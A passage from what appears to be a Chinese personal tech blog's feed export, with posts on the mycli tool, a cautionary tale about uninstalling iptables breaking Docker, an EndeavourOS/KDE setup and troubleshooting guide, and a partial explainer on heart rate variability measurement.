<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RiY2xpL215Y2xp">mycli<i class="fa fa-external-link-alt"></i></span> MySQL的cli工具，能高亮和自动补全</p>
]]></content>
      <categories>
        <category>笔记&amp;札记</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title>不要尝试sudo apt remove iptables</title>
    <url>/a7d1/</url>
    <content><![CDATA[<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/emmm.jpg" alt="Picture" style="zoom:80%;" /> <a id="more"></a></p>
<p>在Ubuntu和Debian里卸载iptables会发生严重的后果（大佬请无视） 一开始我们觉得是防火墙把443端口给办了用不了https，结果我用UFW设置不管用，怀疑是iptables的问题，问了花花师兄，也不清楚，我们决定先把iptables禁用了。随手一谷歌，也忘了哪个神仙说的</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">apt</span> remove iptables <span class="token comment"># 不要乱试！</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>感觉对的嘛，卸个防火墙能出什么问题嘛<br />
然后提示是否卸载我选了y，然后突然在卸载的log发现一堆Docker，瞬间感觉不对劲。然后，然后Docker直接不能用了！ 血泪教训啊，防火墙卸了Docker就不能用了！</p>
<p>随手一搜发现不止我一个人中招啊</p>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/iptables-docker.png" alt="Picture" style="zoom:80%;" /></p>
<p>好家伙</p>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/cnm.png" alt="Picture" style="zoom:80%;" /></p>
<p>行吧，一堆依赖比python2还多</p>
<p>不说了，准备重装系统了<img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/mmm.jpg" alt="Picture" style="zoom:80%;" /></p>
<hr />
<p>停用iptables请使用<code>chkconfig iptables off</code>命令</p>
<hr />
<p>更新，试图垂死挣扎使用</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> network-manager<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>既然把网卡配置删了那就再配置一遍 等会，装了NetworkManager选了默认配置之后连22端口也连不上了。。。 行吧，准备重装 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/wa.jpg" alt="Picture" style="zoom:80%;" /></p>
]]></content>
      <categories>
        <category>102网吧日常</category>
      </categories>
      <tags>
        <tag>iptables</tag>
        <tag>删库跑路</tag>
        <tag>服务器</tag>
      </tags>
  </entry>
  <entry>
    <title>为什么不试试EndeavourOS呢</title>
    <url>/why-not-try-endeavouros/</url>
    <content><![CDATA[<p>sudo pacman -Rs win10</p>
<a id="more"></a>
<p>其实还是建议能折腾的玩家直接上原味Arch。不想装Arch的偷懒用户可以试试这个（不过推荐想用KDE等其他桌面的玩家先选择离线安装，然后卸载xfce的包，再装其他DE。这个在线安装的时候每装一个包都会 -Syu 一下，非常慢）</p>
<h2 id="镜像源">镜像源</h2>
<p>再次更新，你电镜像源有EndeavourOS了： <span class="exturl" data-url="aHR0cDovL21pcnJvcnMudWVzdGMuY24vZW5kZWF2b3Vyb3Mv">http://mirrors.uestc.cn/endeavouros/<i class="fa fa-external-link-alt"></i></span></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"Server = http://mirrors.tuna.tsinghua.edu.cn/endeavouros/repo/<span class="token variable">$repo</span>/<span class="token variable">$arch</span>"</span> <span class="token operator">></span> /etc/pacman.d/endeavouros-mirrorlist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>iso镜像在<span class="exturl" data-url="aHR0cDovL21pcnJvcnMudWVzdGMuY24vZW5kZWF2b3Vyb3MvaXNvLw==">这里<i class="fa fa-external-link-alt"></i></span></p>
<p>清华已经安排上了EndeavourOS的镜像和<span class="exturl" data-url="aHR0cHM6Ly9taXJyb3JzLnR1bmEudHNpbmdodWEuZWR1LmNuL2VuZGVhdm91cm9zL2lzby8=">iso<i class="fa fa-external-link-alt"></i></span>，可以方便的下载iso和更新EndeavourOS的包了。（或者用PT种子下载，实测速度均&gt;10Mb/s）</p>
<p>更改<code>/etc/pacman.d/endeavouros-mirrorlist</code>中的内容，改为</p>
<pre class="line-numbers language-config" data-language="config"><code class="language-config">## China
Server &#x3D; https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;endeavouros&#x2F;repo&#x2F;$repo&#x2F;$arch<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>然后<code>sudo pacman -Syy</code>刷新一下</p>
<h2 id="安装virtualbox虚拟机">安装virtualbox虚拟机</h2>
<p>我用的kernel是lts版本（偶滴本本是Nvidia独显，不敢上kernel一直滚，怕炸）</p>
<p>装头文件、virtualbox组件、网络和vnc扩展（可选）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S linux-lts-headers virtualbox virtualbox-guest-iso virtualbox-host-dkms net-tools virtualbox-ext-vnc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>推荐安装oracle的增强扩展（一些自适应分辨率缩放、USB驱动什么的都在这里面）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yay -S virtualbox-ext-oracle<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后下载镜像（微软貌似出了用于虚拟机的免费90天win10，然而win10还是耗资源，没有什么特殊需求就只是用用office用用QQ什么的开个win7甚至XP虚拟机就好了，在虚拟机里会流畅一点）</p>
<p>增强功能要在win虚拟机中手动安装扩展才能用</p>
<h2 id="终端配置">终端配置</h2>
<h3 id="将bashzsh的终端输出信息和日志改回英文">将bash/zsh的终端输出信息和日志改回英文</h3>
<p>终端有些报错和输出还是要靠英文去谷歌，中文资料太少了，查不到，但是又不想把全局设置成英文的。直接<code>export LANG=en_US.UTF-8</code>不起作用，改成<code>export LANG=en_US</code>变成了英文但是中文乱码了，差了一下LANGUAGE参数的优先级比LANG要高、LC_X参数优先级比LANGUAGE高，修改LANGUAGE变量即可。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">LANGUAGE</span></span><span class="token operator">=</span><span class="token string">"en_US:UTF-8"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>只修改终端那就在.bashrc加上</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token environment constant">$TERM</span>"</span><span class="token operator">=</span><span class="token string">"linux"</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span><span class="token keyword">then</span> 
<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">LANGUAGE</span></span><span class="token operator">=</span>en_US 
<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">LANG</span></span><span class="token operator">=</span>en_US.UTF-8 
<span class="token keyword">fi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="默认终端改为zsh">默认终端改为zsh</h3>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">chsh -s /usr/bin/zsh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>装oh-my-zsh（因为我懒得自己配置zsh了）和插件，并设置默认终端为oh-my-zsh</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yay -S <span class="token function">zsh</span> oh-my-zsh-git autojump zsh-autosuggestions zsh-syntax-highlighting
chsh -s /usr/bin/zsh
<span class="token function">cp</span> /usr/share/oh-my-zsh/zshrc ~/.zshrc <span class="token comment"># 我比较懒，就直接把默认配置拿过来改改</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="更换lts内核">更换lts内核</h2>
<p>更新到5.8以后我的virtualbox又出问题了，换回linux-lts</p>
<p>EndeavourOS有一个叫akm的图形界面，但是你要手动重装virtualbox之类的会受到内核影响的东西。</p>
<h2 id="显卡驱动">显卡驱动</h2>
<blockquote>
<p>so, nvidia f.....</p>
</blockquote>
<p>算了，3080那么强，不黑英伟达了(更新，AMD新卡出了，好家伙</p>
<p>他们从以前Antergos那fork了一个驱动安装脚本，有个包叫nvidia-installer（lts等用户请用nvidia-installer-dkms），看<span class="exturl" data-url="aHR0cHM6Ly9lbmRlYXZvdXJvcy5jb20vZG9jcy9oYXJkd2FyZS1hbmQtbmV0d29yay9ncmFwaGljLWNhcmRzLWdwdS1kcml2ZXItYW5kLXNldHVwLw==">这里<i class="fa fa-external-link-alt"></i></span>。</p>
<h2 id="桌面环境">桌面环境</h2>
<p>EndeavourOS官方魔改定制了xfce的主题和图标，离线安装镜像也只有xfce，其他的几乎没怎么魔改。</p>
<p>如果要装其他DE的话</p>
<p>紫红配色看个人喜好吧，其实我不太能欣赏的来（这个配色，Gitlab同款）</p>
<p>更新，KDE 的 5.20.2 配色和EndeavourOS完全一致，建议他们火速从XFCE迁往KDE（不是</p>
<figure>
<img src="/why-not-try-endeavouros/image-20201031190318540.png" alt="KDE新官网样子" /><figcaption aria-hidden="true">KDE新官网样子</figcaption>
</figure>
<p>多桌面环境可能出问题，非要这样做的话建议每个不同的桌面环境分配一个单独的用户名。 （貌似xfce4和KDE一起用几乎问题（用ssdm），先装ssdm和KDE,然后装xfce4） 尝试了一下i3wm, 简洁是真的简洁，不太习惯又删了换回KDE了。</p>
<p>KDE有一种 Windows Vista 的感觉，感觉是 linux 所有 Desktop Enviroment 里面最舒服的。xfce虽然是EndeavourOS默认的DE，但是xfce开发人手不够，用户和社区贡献者也比KDE少，而且内存占用最新的KDE已经比xfce低了.....现在xfce也不怎么轻量了，渣配置机器上表现没有LXDE好，感觉不少用户都转去用i3wm和KDE了...逐渐没落的夕阳DE，适合养老</p>
<h2 id="硬盘扩容和迁移">硬盘扩容和迁移</h2>
<p>趁打折买了一块西数SN550,之前只有500G还装了个双系统的笔记本可以扩容了</p>
<p>现在把/home分区（大概60G）从老硬盘移动到新硬盘上，空出来的60G给/目录。我既不是LVM也没有组raid，文件系统用的ext4，500G老硬盘分了400G给win10,剩下100G给了linux，分了一个/，40G,一个/home，60G</p>
<p>先格式化（这里我用的GPT分区表，ext4），然后挂载到/mnt,然后用rsync迁移/home下的文件到/mnt 然后umount，然后分区合并给/root，再挂载到/home下面</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">fdisk</span> -l
yay -Sy <span class="token function">rsync</span>

mkfs.ext4 /dev/nvme0n1p1
<span class="token function">mount</span> /dev/nvme0n1p1 /mnt
<span class="token function">rsync</span> -avz /home /mnt
<span class="token function">umount</span> dev//nvme0n1p1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>两边都是nvme,2分钟就同步完成了，速度非常感人，然后修改fstab，将原来/home分区的uuid改为新硬盘的（/dev/nvme0n1p1）uuid</p>
<p><code>/etc/fstab</code>大概长这个样子，分别是uuid,挂载目录，文件类型，noatime后面0表示不开机自检，/</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">UUID</span><span class="token operator">=</span><span class="token number">8205</span>-8BC5                            /boot/efi      vfat    <span class="token assign-left variable">umask</span><span class="token operator">=</span>0077 <span class="token number">0</span> <span class="token number">2</span>
<span class="token assign-left variable">UUID</span><span class="token operator">=</span><span class="token number">36499174</span>-6a4a-4b9d-b5cc-0b1f555a1f46 /              ext4    defaults,noatime <span class="token number">0</span> <span class="token number">1</span>
<span class="token assign-left variable">UUID</span><span class="token operator">=</span>bf5e768c-a2de-4618-9861-5946459a69b6 /home          ext4    defaults,noatime <span class="token number">0</span> <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>然后退出来，用livecd或者双系统的分区工具把原来的/home分区删掉分给原来的/目录。（注意做好备份不要删错了，删错了就没了）</p>
<p>再次登陆后应该就行了。弄完突然发现KDE自带一个叫KDE Partition Manager的工具，看起来貌似还行。</p>
<h2 id="修grub">修grub</h2>
<p>双系统grub又出问题了，好在用liveusb重装了一下grub问题救了回来。</p>
<p>我是UEFI，操作除了最后 grub install 用EndeavourOS的，其他的和Arch一样</p>
<p>先挂载，然后chroot进去，然后重装grub</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mount</span> /dev/nvme0n1p3 /mnt
<span class="token function">mount</span> /dev/nvme1n1p2 /mnt/boot/efi
<span class="token function">grub-mkconfig</span> -o /boot/grub/grub.cfg
grub-install --target<span class="token operator">=</span>x86_64-efi --efi-directory<span class="token operator">=</span>/boot/efi --bootloader-id<span class="token operator">=</span>EndeavourOS-grub<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="滚动升级">滚动升级</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -Syu <span class="token comment"># 装了AUR就yay -Syu</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>如果要自动降级新软件包就<code>-Syuu</code>(不推荐)</p>
<p>升级的包里面有内核和显卡驱动的时候要注意小心</p>
<p>升级内核之后最好重启一下，有的时候不重启会遇到开bbr失败了啊，u盘读不出来了啊，就比如<span class="exturl" data-url="aHR0cHM6Ly9qbGljZS50b3AvcC83bDltby8=">记因内核版本错误导致U盘不能识别的问题解决<i class="fa fa-external-link-alt"></i></span>、<span class="exturl" data-url="aHR0cHM6Ly92MmV4LmNvbS90LzMyMzU1OQ==">这个v站帖子<i class="fa fa-external-link-alt"></i></span>还有重启后<span class="exturl" data-url="aHR0cHM6Ly9tYW5hdGVlbGF6eWNhdC5naXRodWIuaW8vbGludXgvMjAyMC8wMi8xNC9maXgtYXJjaC1ib290LWZhaWxlZC5odG1s">Grub内核版本号不升级<i class="fa fa-external-link-alt"></i></span>，大部分情况下<code>modprobe</code>找不到模块八成就是了</p>
<h3 id="升级内核不重启">升级内核不重启</h3>
<p>参考reddit这个<span class="exturl" data-url="aHR0cHM6Ly93d3cucmVkZGl0LmNvbS9yL2FyY2hsaW51eC9jb21tZW50cy80enJzYzMva2VlcF95b3VyX3N5c3RlbV9mdWxseV9mdW5jdGlvbmFsX2FmdGVyX2Ffa2VybmVsLw==">帖子<i class="fa fa-external-link-alt"></i></span></p>
<p>一个软链过去，感觉不太优雅，还是乖乖重启比较好</p>
<blockquote>
<p>看来包管理器们应该学习其他两个系统，统一在关机开机的时候更新软件。</p>
</blockquote>
<h2 id="kde使用事项">KDE使用事项</h2>
<h3 id="kde卡死的抢救方案">KDE卡死的抢救方案</h3>
<p>KDE现在已经比较稳定了，但是Linux桌面程序还是偶尔把桌面搞到卡死，比如vscode内存泄漏。</p>
<p>首先尝试<code>ctl+alt+t</code>呼出终端，如果不能就<code>ctl+alt+F2</code>调出tty，htop看一下那个进程占用高，kill掉，如果不行就重启tty</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kquitapp5 plasmashell <span class="token operator">&amp;&amp;</span> kstart5 plasmashell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>正常退出不行就直接killall</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">killall</span> plasmashell <span class="token operator">&amp;&amp;</span> kstart5 plasmashell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>或者重启一下SDDM</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl restart sddm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>还不行就杀掉tty1，然后重启xorg</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> aux <span class="token operator">|</span> <span class="token function">grep</span> tty1 <span class="token comment"># 或者pgrep tty1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后kill掉（或者直接<code>pkill -9 -t tty1</code>），重启 或者直接</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">pkill</span> x
startx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>再不行直接<code>reboot</code>就好了</p>
<p>或许你开了SysRq，先用SysRq抢救一下，见<span class="exturl" data-url="aHR0cHM6Ly93d3cua2VybmVsLm9yZy9kb2MvaHRtbC9sYXRlc3QvYWRtaW4tZ3VpZGUvc3lzcnEuaHRtbA==">Linux Magic System Request Key Hacks<i class="fa fa-external-link-alt"></i></span>，或者直接看<span class="exturl" data-url="aHR0cDovL2Jsb2cubHVqdW45OTcyLndpbi9ibG9nLzIwMTgvMDgvMjIvbGludXjkuIvnmoRzeXNycemUri9pbmRleC5odG1s">linux下的SysRq键<i class="fa fa-external-link-alt"></i></span></p>
<p>再不行就直接尝试长按电源关机了</p>
<h3 id="混成器">混成器</h3>
<p>有Nvidia显卡怕驱动更新出问题可以在设置中将渲染器（混成器）从OpenGL改为XRender，XRender出问题的情况会少一点，虽然很多特效都不支持，性能也略差。没有问题建议还是用OpenGL或者直接关闭特效，XRender没有硬件加速用起来感觉跟OpenGL有明显的体验差距。</p>
<p>另外貌似非整数比缩放的时候透明特效之类的经常不支持，建议直接关了。</p>
<h3 id="baloo">baloo</h3>
<p>禁用baloo：<code>balooctl disable</code> 这个文件索引服务也是个吃性能大户，不管是在GNOME下还是KDE下。可以考虑禁用。要查找文件可以用find命令之类的东西嘛。</p>
<h3 id="kde桌面部件">KDE桌面部件</h3>
<p>美化要稍微谨慎一点，魔改太多了不太稳定</p>
<p>latte-dock：虽然KDE官方维护支持这个，动画效果很漂亮，用起来也很舒服，但是这个实在是吃内存大户。KDE桌面不开多余特效和装各种桌面部件待机内存在300M，装个latte-dock后内存占用比其他所有的加起来还多。把dock的鼠标悬停放大之类的特效关一关。貌似这个的背景透明只有XRender支持。</p>
<p>一个很喜欢的任务栏部件event calendar</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yay -S plasma5-applets-eventcalendar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="双显示器开机右侧出现黑边">双显示器开机右侧出现黑边</h3>
<p>发现是每次开机分辨率变成1680*1050了</p>
<p>先看一下你的显示器编号</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">xrandr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>比如我的就是DVI-I-1和DVI-D-0，把这两个分辨率改回1080p</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">xrandr --output DVI-I-1 --mode 1920x1080 --rate <span class="token number">60</span>
xrandr --output DVI-D-0 --mode 1920x1080 --rate <span class="token number">60</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>这里有一个自动配置的包<span class="exturl" data-url="aHR0cHM6Ly93d3cuYXJjaGxpbnV4Lm9yZy9wYWNrYWdlcy8/bmFtZT1hdXRvcmFuZHI=">autorandr<i class="fa fa-external-link-alt"></i></span></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S autorandr
autorandr horizontal <span class="token operator">&amp;&amp;</span> autorandr vertical <span class="token comment"># 这里我直接把显示长宽分辨率都直接拉满了</span>
autorandr --save test1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>或者你可以手动编辑<code>/etc/X11/xorg.conf.d</code>下的配置</p>
<p>见<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL1hyYW5kcg==">Arch Wiki xrandr<i class="fa fa-external-link-alt"></i></span></p>
<p>其实每次开机运行一下xrandr可能更好一点（如果你不是wayland的话），不少人都是这么搞得（顺便刷新调整一下字体啥的</p>
<figure>
<img src="/why-not-try-endeavouros/image-20200923222725926.png" alt="xrandr" /><figcaption aria-hidden="true">xrandr</figcaption>
</figure>
<h2 id="macwin10上的一些软件">Mac/win10上的一些软件</h2>
<p><del>请阅读王垠经典博文完全用linux工作</del> 不少时候用wine还是能搞定的（如果你不在乎wine的稳定性的话），包括一些大型软件，比如PS 当然有的东西用wine体验远没有虚拟机好，拿Virtualbox或者KVM开个虚拟机是个不错的选择。或者身边有闲置安卓机用scrcpy投屏，或者KDE Connect传文件。</p>
<p>部分国产软件开个黑果虚拟机感觉体验比windows虚拟机略好一点 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZveGxldC9tYWNPUy1TaW1wbGUtS1ZN">https://github.com/foxlet/macOS-Simple-KVM<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="一点闲话">一点闲话</h2>
<p>其实我一直很期待Arch系诞生一批用户友好的桌面发行版，就像Debian那样衍生出Ubuntu、Linux Mint那样。（虽然这很不Arch）</p>
<ol type="1">
<li>之前被apt的地狱依赖搞得心态崩了，想用pacman系的（反正打包粒度粗一点好，硬盘现在这么便宜又不在乎占多大地方）</li>
<li>喜欢KDE</li>
<li>想要稳定一点的系统做日常主力搬砖用</li>
<li>安装方便一点。这个倒是无所谓，不过出了事LiveCD抢救也想有个图形界面方便抢修</li>
</ol>
<p>Arch把wifi-menu去掉之后就不太想用原味Arch了，我这笔记本没网口高通网卡Nividia独显实在八字不合，只想佛系地找个好装的iso</p>
<p>KaOS基本符合，然而包太少（加上KCP社区包也还是很少），可惜.... 另一个<span class="exturl" data-url="aHR0cHM6Ly93d3cuY2hha3JhbGludXgub3JnLw==">chakra<i class="fa fa-external-link-alt"></i></span>也是包太少（这个有自己的CCR社区包，包也不多），KDE和Qt骨灰爱好者的宝藏，软件基本全套KDE和Qt（不过据说他们人手不够维护不过来了打算换到）</p>
<p>此外还有各种层出不穷的真*Arch安装器 <span class="exturl" data-url="aHR0cHM6Ly9maXJlcmFpbi5tZS8=">https://firerain.me/<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9nYXJ1ZGFsaW51eC5vcmcvaW5kZXguaHRtbA==">https://garudalinux.org/index.html<i class="fa fa-external-link-alt"></i></span></p>
<p>Antergos的继承者，EndeavourOS满足了前两点，貌似xfce主题魔改了点主题，KDE基本原封不动。当时Manjaro闹分裂，jonathon出走了，我也跟着跑路到了这个发行版;用了一段时间感觉还不错，接近原味Arch, 不像Manjaro一样整了很多超出自己驾驭能力的魔改。推荐各位Manjaro用户和想用pacman又嫌麻烦的用户尝试一下。 现在看win10反而不习惯，索性把教研室搬砖那台win10全格了只装这个（要用到windows的时候上win7虚拟机 ps. win7 和KDE好像啊）</p>
<p>那天还看到肥猫跑到Manjaro群里推这个</p>
<p><img src="/why-not-try-endeavouros/miao.png" /></p>
<p>第二天welcome就有了中文，感动</p>
<p><img src="/why-not-try-endeavouros/miaomiao.png" /></p>
<p>能制止Manjaro的不是Arch佬的疯狂洗手，是另一个比Manjaro更好的Arch简易安装器，EndeavourOS合格了。</p>
<p>最后，不要对EndeavourOS抱有过高的期待，感觉他们人手还是不太足。</p>
<p>不过大方向是走对了，基本上就做做开箱即用和一些代替命令操作的图形界面，没有像Manjaro那样各种魔改搞出很多Arch上反而没有的问题。就比如linux内核切换的图形界面akm，基本上就是代替了archwiki上的手动操作，选项也只有linux,linux-lts,linux-zen几个。不像Manjaro那个内核切换，从linux 5.3 到linux 5.8最新版全都有，非常奔放，你要是真随便选一个linux和linux-lts之外的，哪天滚着滚着就出问题了。</p>
<p><img src="/why-not-try-endeavouros/akm.png" /></p>
<p>Arch的安装脚本和只是换了个皮的安装器层出不穷，目前看来EndeavourOS是最令人满意的一个（好吧，默认是xfce，这个离线装了然后改DE就好了）</p>
<h2 id="最后">最后</h2>
<p>AUR包数量很庞大，但也有一些包目前还没有，有精力和意愿打包的可以去给AUR提交打包 可以参看</p>
<ol type="1">
<li><span class="exturl" data-url="aHR0cHM6Ly9hdXIuYXJjaGxpbnV4Lm9yZy8=">Archlinux User Repository<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0NyZWF0aW5nX3BhY2thZ2Vz">Creating packages<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0FyY2hfVXNlcl9SZXBvc2l0b3J5XyjnroDkvZPkuK3mlocp">Arch用户仓库<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnlvaXRzdS5tb2UvYXJjaC1saW51eC9hdXJfcGFja2FnaW5nX2d1aWRlYm9vay5odG1s">AUR 纯萌新向入门教学(2)-创建一个软件包<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnlvaXRzdS5tb2UvYXJjaC1saW51eC9hdXJfc3VtYml0aW5nX2d1aWRlYm9vay5odG1s">AUR 纯萌新向入门教学(3)-提交软件包到AUR<i class="fa fa-external-link-alt"></i></span></li>
</ol>
<p>KDE的中文翻译也缺人，有精力的玩家可以去当翻译，中文翻译组在<span class="exturl" data-url="aHR0cHM6Ly9jcm93ZGluLmNvbS9wcm9qZWN0L2tkZW9yZw==">这里<i class="fa fa-external-link-alt"></i></span> KDE那边貌似挺缺打杂苦力的，熟悉Qt的同学可以去给社区做点贡献.</p>
]]></content>
      <categories>
        <category>不务正业系列</category>
      </categories>
      <tags>
        <tag>KDE</tag>
        <tag>EndeavourOS</tag>
      </tags>
  </entry>
  <entry>
    <title>也谈心率变异性</title>
    <url>/2873/</url>
    <content><![CDATA[<p>等待填坑 <a id="more"></a></p>
<h2 id="采集">采集</h2>
<p>HRV测定的是NN间期(在正常的窦性心律时就是RR间期)的波动，主要与自主神经调控机制有关。标准的HRV根据正常窦性搏动的NN间期得出的（正常对正常间期，normal-to-normal,<em>NN</em> intervals，即由窦房结除极所致相邻QRS波群之间的所有间期）的变化来表示心率的变异性。</p>
<p><img src="heart-rate-varibility/201804091523323502.png" alt="提取心率变异性" style="zoom: 67%;" /></p>
<h3 id="心电ecg">心电（ECG）</h3>
<p>可以从心电图中直接提取R波尖峰并将RR间期的值用于心率变异性分析</p>
<h3 id="心冲击图bcg">心冲击图（BCG）</h3>
<p>心冲击图去除呼吸和活动的干扰后提取JJ间期时间计算心率变异</p>
<h3 id="光电容积图ppg">光电容积图（PPG）</h3>
<p>目前市面上主要的脉搏波测量方法是光电容积脉搏波描记法（photoplethysmography），用光电传感器检测光经过人体的反射和衰减转换成电信号后得到，包括Apple Waltch等手环产品，用光电容积法检测血氧、心率、心率变异性等生理参数。</p>
<figure>
<img src="/2873/figure-1-optical-heart-rate-sensing.jpg" alt="光电容积法原理" /><figcaption aria-hidden="true">光电容积法原理</figcaption>
</figure>
<p>PPG法采集到的脉搏波经过去噪和整流等处理后提取PP间期可以计算心率变异。</p>
<h4 id="远程光电容积扫描">远程光电容积扫描</h4>
<p>（rPPG，remote PPG）是一种新的方法，只要高清摄像头检测光线变化，真正的无创非接触。</p>
<p>但是这种方法成本高，易受到运动和光线变化的干扰。目前这个领域比较热门，进展也很快。一些补偿和增强鲁棒性的方法包括全局和局部运动跟踪和独立成分分析等。</p>
<p>现在此类研究缺乏可靠的公开数据集支持，现有研究大多采用MAHNOB-HCI和DEAP等用于活体识别和情感识别的公开数据集和私有数据集。</p>
<figure>
<img src="/2873/figure-3-overview-hr-and-hrv.jpg" alt="rPPG-HRV" /><figcaption aria-hidden="true">rPPG-HRV</figcaption>
</figure>
<h2 id="产生机理和影响因素">产生机理和影响因素</h2>
<figure>
<img src="/2873/示意图.png" alt="示意图" /><figcaption aria-hidden="true">示意图</figcaption>
</figure>
<blockquote>
<p>HRV反映的是自主神经和非自主神经系统所有反馈回路极其复杂的非线性交互作用。自主神经系统是窦性节律条件下心率的主要调节机制。</p>
</blockquote>
<p>忽略微小的影响，HRV的高频部分主要受迷走神经的调节，低频部分受到迷走和交感神经的双重作用。</p>
<p><img src="/2873/nero2.jpg" /></p>
<blockquote>
<p>交感神经增强自律性，而副交感神经抑制自律性。交感神经通过增加起搏点去极化程度产生变时性作用，而对心脏起搏点细胞的迷走刺激会引起超极化而降低去极化程度。自主神经的这两个分支均影响与心脏起搏细胞去极化相关的离子通道的活动。</p>
</blockquote>
<p>被测者的体位也会显著影响HRV，多数人处于仰卧位时，副交感神经活动明显增强。</p>
<p>在突然站立或倾斜时，压力反射活动也会引起心率的同步波动。</p>
<p>在24小时HRV中，白天交感神经活动相对增强，心率较快，而夜间迷走神经活动增强，心率较慢。正常睡眠时，生理活动也随每个睡眠周期(约90分钟)而呈现明显节律。</p>
<p>精神情绪的波动也会影响HRV，和迷走神经和交感神经系统的兴奋性有关。</p>
<p><img src="heart-rate-varibility/image-20191225214555467.png" alt="image-20191225214555467" style="zoom:50%;" /></p>
<p>此外，非自主神经因素(如神经内分泌功能)也会影响HRV。</p>
<p>心率变异性也和年龄、性别等因素有关。</p>
<h2 id="主要指标和数据分析">主要指标和数据分析</h2>
<h3 id="时域特征">时域特征</h3>
<p>医学上通常要求5分钟以上的的HRV做短时分析，但是有研究表明30s内的HF和LF和5分钟的没有太大区别，应用是可以进一步缩短检测时间。</p>
<ul>
<li><p>SDNN(ms)：NN间期(正常RR间期)的标准差(5分钟)</p></li>
<li><p>SDANN(ms)：NN间期(正常RR间期)的标准差（24小时）</p></li>
